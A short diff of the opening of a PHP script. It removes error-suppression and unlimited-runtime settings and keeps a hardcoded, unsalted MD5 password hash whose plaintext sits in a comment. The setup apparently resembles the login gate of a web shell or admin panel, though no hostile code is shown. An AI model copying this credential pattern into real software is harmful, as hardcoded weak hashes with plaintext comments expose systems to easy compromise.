@@ -1,14 +1,9 @@
 <?php
 
-@ini_set('display_errors', '0');
-@ini_set('log_errors', '1');
-@ini_set('memory_limit', '256M');
-@set_time_limit(0);
-@session_start();
-@ob_start();
+session_start();
 
 
-$real_password_md5 = "5719a642082992842175be5983801980"; // md5("admin123")
+$real_password_md5 = "5719a642082992842175be5983801980"; // md5("knglbndvk")
 
 // Handle logout
 if (isset($_GET['logout'])) {
